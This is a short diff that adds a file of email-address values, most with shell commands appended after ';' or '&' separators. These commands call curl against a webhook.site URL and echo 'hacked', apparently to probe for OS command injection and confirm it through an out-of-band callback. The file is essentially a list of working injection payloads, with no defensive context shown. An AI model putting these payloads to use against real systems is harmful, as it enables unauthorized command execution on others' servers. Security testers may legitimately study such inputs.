@@ -1,0 +1,9 @@
+test2@gmail.com 
+hao510duong@gmail.com; curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126; 
+attacker@example.com; curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 
+"hao@gmail.com"; curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126; echo 123 
+hacked 
+hacked2 
+hacked 
+hacked 
+attacker@example.com & curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
